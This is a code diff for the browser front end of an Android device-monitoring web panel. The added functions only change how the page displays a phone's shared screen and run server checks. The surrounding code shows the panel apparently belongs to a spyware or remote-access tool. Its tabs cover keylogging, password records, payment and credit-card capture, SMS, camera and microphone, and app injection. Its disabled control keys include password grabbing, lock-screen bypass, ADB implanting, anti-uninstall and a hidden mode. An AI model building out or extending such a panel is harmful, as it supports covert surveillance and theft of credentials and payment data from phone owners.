@@ -47,6 +47,7 @@ function updateDetailHeader(d){
  $('dev-battery').textContent=d.battery===null?'电量未上报':d.battery+'%';
  $('dev-id').textContent='设备ID: '+d.uid;$('dev-system').textContent='系统 Android '+d.android;
  $('dev-last').textContent=d.demo?'演示记录 · 无真实心跳':'最后心跳 '+showDate(d.last);
+ renderNetworkTop();
  $('detail-edit').disabled=d.layoutOnly;$('detail-revoke').hidden=d.demo;$('detail-revoke').disabled=false;
 }
 function infoTile(label,value,type=''){return `<div class="info-tile"><div class="info-label">${esc(label)}</div><div class="info-value ${type}">${esc(value)}</div></div>`;}
@@ -179,7 +180,7 @@ async function pollScreenPreview(){
   im.onload=()=>{
    if(screenPreviewUrl!==newUrl)return;
    screenReceivedCount++;screenLastFrame=Date.now();
-   im.style.display='block';$('be-live-hint').style.display='none';$('be-live-badge').style.display='block';$('be-screen-stopview').style.display='block';
+   im.style.display='block';applyViewerSettings();$('be-live-hint').style.display='none';$('be-live-badge').style.display='block';$('be-screen-stopview').style.display='block';
    const age=response.headers.get('X-Frame-Age-Ms')||'?';
    setScreenDiag('HTTP 200 · JPEG '+blob.size+'B · '+im.naturalWidth+'×'+im.naturalHeight+' · 帧龄 '+age+'ms · 已显示 '+screenReceivedCount+' 帧');
    if(old)URL.revokeObjectURL(old);
@@ -243,9 +244,162 @@ function initMenus(){
  // Add one transparent operational entry without displacing the original visual hierarchy.
  const security=[...$('sidebar').querySelectorAll('button')].find(b=>b.dataset.module==='安全中心');if(security){const b=document.createElement('button');b.innerHTML='<span class="ico">▤</span>操作日志';b.dataset.module='操作日志';b.onclick=()=>openModule('操作日志');security.insertAdjacentElement('afterend',b);}
 }
+
+/* V5.4 Control keys: real website-side operations only; the phone is never commanded silently. */
+const keyDefinitions=[
+ ['隐藏屏幕'],['锁定屏幕'],['开启阅读器'],['阅读器设置'],['开启ADB模式'],['开启无障碍'],['关闭无障碍'],['无障碍状态'],
+ ['密码获取'],['一键解锁'],['画面亮度','brightness'],['开启静音'],['黑屏遮挡'],['取消黑屏'],['开启勿扰'],['关闭勿扰'],
+ ['无视锁屏'],['系统锁屏'],['ADB投屏'],['停止观看','pause'],['设备管理','manage'],['关闭声音'],['系统更新'],['投屏设置','settings'],
+ ['画面旋转','rotate'],['开始观看','resume'],['刷新连接','refresh'],['网络诊断','network'],['设备信息','info'],['操作日志','events'],['运行状态','status'],['IP/服务器','ipserver'],
+ ['植入ADB'],['重启ADB'],['无线配对'],['全屏投屏','full'],['安全设置','safety'],['导入权限'],['应用管理'],['管理设备','manage'],
+ ['投屏设置','settings'],['开启日志','events'],['关闭防卸载'],['隐藏模式'],['检查状态','status'],['同步配置','refresh'],['重启连接','refresh'],['重启RPC']
+];
+const viewerDefaults={intervalMs:1500,brightness:100,fit:'contain',rotation:0};
+let viewerSettings={...viewerDefaults},screenLastPoll=0;
+try{const stored=JSON.parse(localStorage.getItem('be_viewer_v54')||'{}');
+ if([900,1500,1800,2500].includes(stored.intervalMs))viewerSettings.intervalMs=stored.intervalMs;
+ if(Number.isFinite(stored.brightness)&&stored.brightness>=60&&stored.brightness<=150)viewerSettings.brightness=stored.brightness;
+ if(['contain','cover'].includes(stored.fit))viewerSettings.fit=stored.fit;
+ if([0,90,180,270].includes(stored.rotation))viewerSettings.rotation=stored.rotation;
+}catch{}
+function viewerPersist(){localStorage.setItem('be_viewer_v54',JSON.stringify(viewerSettings));}
+function applyViewerSettings(){const im=$('be-live-image');if(!im)return;
+ im.style.objectFit=viewerSettings.fit;
+ im.style.filter='brightness('+viewerSettings.brightness+'%)';
+ im.style.transform='rotate('+viewerSettings.rotation+'deg)';
+ const turnSide=viewerSettings.rotation===90||viewerSettings.rotation===270;
+ im.style.width=turnSide?'auto':'100%';im.style.height=turnSide?'100%':'100%';
+ im.style.maxWidth='100%';im.style.maxHeight='100%';
+}
+function viewerDialog(){let el=$('be-viewer-dialog');if(el)return el;
+ el=document.createElement('dialog');el.id='be-viewer-dialog';el.className='be-viewer-dialog';
+ el.innerHTML=`<h3>投屏设置 <small>只改变网页观看效果，不控制手机</small></h3>
+ <label>画面刷新间隔 <select id="be-v-interval"><option value="900">0.9秒</option><option value="1500">1.5秒</option><option value="1800">1.8秒</option><option value="2500">2.5秒</option></select></label>
+ <label>画面显示方式 <select id="be-v-fit"><option value="contain">完整显示</option><option value="cover">填满窗口（可能裁切）</option></select></label>
+ <label>网页画面亮度 <input id="be-v-brightness" type="range" min="60" max="150" step="5"><output id="be-v-brightness-value"></output></label>
+ <div class="be-v-row"><button type="button" id="be-v-reset">恢复默认</button><button type="button" id="be-v-close">完成</button></div>
+ <p>“停止观看”只暂停当前浏览器窗口；若要结束手机的实际屏幕共享，必须在 Pixel 3 上点击“停止屏幕共享”。</p>`;
+ document.body.appendChild(el);
+ el.querySelector('#be-v-close').onclick=()=>el.close();
+ el.querySelector('#be-v-reset').onclick=()=>{viewerSettings={...viewerDefaults};viewerPersist();viewerSyncControls();applyViewerSettings();};
+ for(const [id,k] of [['be-v-interval','intervalMs'],['be-v-fit','fit'],['be-v-brightness','brightness']])el.querySelector('#'+id).oninput=e=>{
+   viewerSettings[k]=k==='fit'?e.target.value:Number(e.target.value);viewerPersist();viewerSyncControls();applyViewerSettings();
+ };
+ return el;
+}
+function viewerSyncControls(){const dlg=$('be-viewer-dialog');if(!dlg)return;
+ dlg.querySelector('#be-v-interval').value=String(viewerSettings.intervalMs);
+ dlg.querySelector('#be-v-fit').value=viewerSettings.fit;
+ dlg.querySelector('#be-v-brightness').value=String(viewerSettings.brightness);
+ dlg.querySelector('#be-v-brightness-value').textContent=viewerSettings.brightness+'%';
+}
+function pauseWatching(){if(!activeDevice||activeDevice.demo){toast('演示设备没有实时画面');return;}
+ const b=ensureLiveScreen()?.querySelector('#be-screen-stopview');if(b){b.click();toast('已暂停当前网页观看；手机端共享仍可能继续');}}
+function resumeWatching(){if(!activeDevice||activeDevice.demo){toast('演示设备无法连接实际画面');return;}
+ screenViewing=true;screenLastPoll=0;
+ ensureLiveScreen();const im=$('be-live-image');if(im&&im.src&&screenLastFrame)im.style.display='block';
+ $('be-live-hint').textContent='正在获取手机端已授权共享的画面…';
+ setScreenDiag('正在重新连接画面…');void pollScreenPreview();toast('网页已恢复观看');}
+function showKeyInfo(title,lines){let d=$('be-key-dialog');if(!d){d=document.createElement('dialog');d.id='be-key-dialog';d.className='be-viewer-dialog';
+ d.innerHTML='<h3 id="be-key-title"></h3><div id="be-key-content" class="be-key-content"></div><div class="be-v-row"><button type="button" id="be-key-close">关闭</button></div>';
+ document.body.appendChild(d);d.querySelector('#be-key-close').onclick=()=>d.close();}
+ d.querySelector('#be-key-title').textContent=title;
+ d.querySelector('#be-key-content').replaceChildren(...lines.map(line=>{const p=document.createElement('p');p.textContent=line;return p;}));d.showModal();}
+async function keyNetwork(){const id=activeDevice?.id;if(!id)return;
+ showKeyInfo('网络诊断',['正在检测服务器和设备信息接口…']);
+ const results=[];
+ for(const [label,url] of [['服务器健康状态','/api/health'],['设备信息接口','/api/devices/'+encodeURIComponent(id)+'/overview']]){
+ const t=performance.now();try{const response=await fetch(url,{credentials:'same-origin',cache:'no-store'});
+ results.push(label+'：HTTP '+response.status+' / '+Math.round(performance.now()-t)+'ms');}
+ catch(e){results.push(label+'：连接失败 '+(e.message||'未知错误'));}}
+ results.push('检测范围：网页至服务器，不代表手机的网络时延');
+ if($('be-key-dialog')?.open)showKeyInfoReplace('网络诊断',results);
+}
+function showKeyInfoReplace(title,lines){const dlg=$('be-key-dialog');if(!dlg)return;dlg.querySelector('#be-key-title').textContent=title;dlg.querySelector('#be-key-content').replaceChildren(...lines.map(line=>{const p=document.createElement('p');p.textContent=line;return p;}));}
+function isRealViewer(){return !!activeDevice&&!activeDevice.demo&&mode==='real';}
+function executeKey(action){if(!activeDevice)return;
+ switch(action){
+ case 'pause':pauseWatching();break;
+ case 'resume':resumeWatching();break;
+ case 'full':{
+  if(!isRealViewer()){toast('请先进入已注册真实设备');return;}
+  const el=ensureLiveScreen();if(!el)return;
+  if(document.fullscreenElement){void document.exitFullscreen();}else if(el.requestFullscreen){void el.requestFullscreen().catch(e=>toast('浏览器全屏失败：'+e.message));}else toast('当前浏览器不支持全屏');
+  break;}
+ case 'settings':case 'brightness':{const d=viewerDialog();viewerSyncControls();d.showModal();if(action==='brightness')d.querySelector('#be-v-brightness').focus();break;}
+ case 'rotate':viewerSettings.rotation=(viewerSettings.rotation+90)%360;viewerPersist();applyViewerSettings();toast('仅网页画面旋转 '+viewerSettings.rotation+'°，手机方向没有改变');break;
+ case 'refresh':{if(activeDevice.demo){toast('演示设备不支持真实连接刷新');return;}
+  void refreshOverview(false).then(()=>{screenLastPoll=0;void pollScreenPreview();});break;}
+ case 'network':void keyNetwork();break;
+ case 'ipserver':void showIpServer();break;
+ case 'safety':showKeyInfo('安全设置',['屏幕共享只由手机端用户开始并授权。','观看端不具备修改手机 IP、绕过系统锁或访问密码的权限。','如需修改手机网络 IP，请由设备持有人在 Android 系统网络设置中进行。']);break;
+ case 'info':selectPanel('设备信息');break;
+ case 'events':selectPanel('操作记录');break;
+ case 'manage':edit(activeDevice);break;
+ case 'status':{
+  const d=activeDevice;
+  showKeyInfo('运行状态',[`设备：${d.name}（${d.demo?'演示':'真实'}）`,`当前：${d.online?'在线':'离线'} · 最近心跳：${d.demo?'演示记录':showDate(d.last)}`,
+  `设备电量：${d.battery??'未上报'}% · 网络：${d.network}`,`网页画面：${screenViewing?'观看中':'已暂停'} · 请求${screenRequestCount}次 / 已显示${screenReceivedCount}帧`,
+  `最近画面：${$('be-screen-diag')?.textContent||'尚无数据'}`,`仅显示真实状态，不会远程修改手机系统。`]);break;}
+ }
+}
+function initControlKeys(){const root=$('commands');
+ root.innerHTML=keyDefinitions.map(([label,action])=>{
+  const supported=Boolean(action);const hint=supported?'可用：'+({pause:'仅停止网页观看，不停止手机投屏',resume:'继续观看手机主动授权的共享画面',full:'网页窗口全屏',rotate:'只旋转网页图像',brightness:'调整网页图像亮度',settings:'网页显示参数设置',refresh:'从服务器重新读取设备状态',network:'检测服务器接口延迟',info:'读取已注册设备信息',events:'已存储的管理操作记录',status:'展示真实连接统计',manage:'保存名称、分组与备注',ipserver:'显示设备上报的 IP 与真实服务器状态',safety:'查看安全限制与授权状态'}[action]||'网页功能'):'未接入。不执行手机操作或绕过系统授权。';
+  return `<button type="button" data-safe-key="${esc(action||'')}" title="${esc(hint)}" ${supported?'':'disabled aria-disabled="true"'} class="${supported?'be-ready':''}">${esc(label)}</button>`;
+ }).join('');
+ root.querySelectorAll('button.be-ready').forEach(b=>b.onclick=()=>executeKey(b.dataset.safeKey));
+}
+
+/* Exact-location clocks, current server endpoint, and network diagnostics (read-only). */
+const clockFormatter={
+ sa:new Intl.DateTimeFormat('zh-CN',{timeZone:'Africa/Johannesburg',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false}),
+ bj:new Intl.DateTimeFormat('zh-CN',{timeZone:'Asia/Shanghai',hour:'2-digit',minute:'2-digit',second:'2-digit',hour12:false})
+};
+let serverProbe={status:'检测中',http:0,latency:null,checked:0,version:'—'};
+function tickLiveClocks(){const now=new Date();
+ for(const [id,f] of [['clock-sa','sa'],['clock-bj','bj'],['detail-clock-sa','sa'],['detail-clock-bj','bj']]){
+  const el=$(id);if(el)el.textContent=clockFormatter[f].format(now);
+ }
+}
+function deviceIpValue(d){return String(d?.ip||'未上报');}
+function renderNetworkTop(){
+ const d=activeDevice;
+ const ip=$('dev-ip-live');if(ip)ip.textContent='IP: '+deviceIpValue(d);
+ const server=$('detail-ipserver');if(server){server.textContent='服务器: '+(serverProbe.http===200?'已连接':'待检测')+' · '+(serverProbe.latency===null?'—':serverProbe.latency+'ms')+' · IP/服务器';server.title=location.origin+' · '+serverProbe.status;}
+ const id=$('dev-netstate');if(id)id.textContent=d?.country||'地区未上报';
+ const list=$('head-server-live');if(list){list.textContent=serverProbe.http===200?'● 服务器正常':'● 服务器待检测';list.title=location.origin;}
+}
+async function probeServer(){const start=performance.now();try{
+ const response=await fetch('/api/health',{cache:'no-store',credentials:'same-origin'});
+ let data={};try{data=await response.json();}catch{}
+ serverProbe={status:response.ok?'运行正常':'HTTP '+response.status,http:response.status,latency:Math.round(performance.now()-start),checked:Date.now(),version:data.version||'—'};
+ }catch(e){serverProbe={status:'网络错误：'+(e.message||'请求失败'),http:0,latency:null,checked:Date.now(),version:'—'};}
+ renderNetworkTop();
+}
+async function showIpServer(){
+ const d=activeDevice;const ip=deviceIpValue(d);
+ showKeyInfo('IP / 服务器连接信息',['正在刷新服务器连接状态…']);
+ await probeServer();
+ showKeyInfoReplace('IP / 服务器连接信息',[
+  '手机设备：'+(d?.name||'—')+' · '+(d?.demo?'演示设备':'真实设备'),
+  '设备 IP：'+ip+(ip==='未上报'?'（客户端目前没有上报 IP；不填写虚构地址）':''),
+  '设备地区：'+(d?.country||'未上报'),
+  '服务器域名：'+location.host,
+  '服务器地址：'+location.origin,
+  '服务器状态：'+serverProbe.status+' · HTTP '+serverProbe.http,
+  '浏览器到服务器请求耗时：'+(serverProbe.latency===null?'不可用':serverProbe.latency+'ms'),
+  '服务器版本：'+serverProbe.version,
+  '最近心跳：'+(d?.demo?'演示数据':showDate(d?.last)),
+  '说明：这里显示真实读取信息，不修改 Pixel 3 的系统 IP，也不更改 Render 环境变量。'
+ ]);
+}
+
 function init(){
  const t=document.createElement('div');t.id='toast';document.body.append(t);
  initMenus();
+ tickLiveClocks();setInterval(tickLiveClocks,1000);void probeServer();setInterval(()=>{if(document.visibilityState==='visible')void probeServer();},15000);
+ $('detail-ipserver').onclick=()=>{void showIpServer();};$('head-server-live').onclick=()=>{void showIpServer();};
  $('mode-demo').onclick=()=>switchMode('demo');$('mode-real').onclick=()=>switchMode('real');$('preview').onclick=()=>{layoutPreview=!layoutPreview;load();};
  $('refresh').onclick=load;$('search').oninput=()=>{page=1;render();};
  for(const id of ['group-filter','status-filter','country-filter'])$(id).onchange=()=>{page=1;render();};
@@ -254,9 +408,7 @@ function init(){
  $('back').onclick=openList;$('detail-edit').onclick=()=>activeDevice&&edit(activeDevice);$('detail-revoke').onclick=revoke;
  $('meta-form').onsubmit=saveMeta;$('meta-cancel').onclick=()=>$('meta-dialog').close();
  $('add-pair').onclick=()=>openModule('设备授权');
- const commandLabels=['隐藏屏幕','锁定屏幕','开启阅读器','阅读器设置','开启ADB模式','开启无障碍','关闭无障碍','无障碍状态','屏幕旋转','系统投屏','ADB投屏','关闭投屏','亮度调节','开启静音','系统更新','投屏设置','同步翻译','文件管理','应用管理','远程协助','重启连接','网络诊断','设备信息','操作日志','进入ADB','重启ADB','无线配对','全屏投屏','运行状态','安全设置','导入权限','设备管理'];
- $('commands').innerHTML=commandLabels.map(s=>`<button ${['设备信息','操作日志'].includes(s)?'':'disabled title="未接入已授权的 Android 控制服务"'} data-command="${esc(s)}">${esc(s)}</button>`).join('');
- $('commands').querySelectorAll('button:not([disabled])').forEach(b=>b.onclick=()=>selectPanel(b.dataset.command==='操作日志'?'操作记录':'设备信息'));
+ initControlKeys();
  const labels=['AI分析','设备信息','操作记录','密码记录','支付捕获','短信','键盘日志','信用卡数据','摄像/麦克风','相册','文件','应用/注入','通讯录','权限','群发功能'];
  $('tabs').innerHTML=labels.map(name=>`<button class="tool" data-panel="${esc(name)}">${esc(name)}</button>`).join('');
  $('tabs').querySelectorAll('button').forEach(b=>b.onclick=()=>selectPanel(b.dataset.panel));
@@ -281,5 +433,5 @@ function init(){
 document.addEventListener('DOMContentLoaded',init);
 
 // Poll only while a real enrolled-device detail is open and foregrounded.
-setInterval(()=>{void pollScreenPreview();},1800);
+setInterval(()=>{if(Date.now()-screenLastPoll>=viewerSettings.intervalMs){screenLastPoll=Date.now();void pollScreenPreview();}},180);
 // Stop-view action is attached by ensureLiveScreen() for both original and repaired layouts.
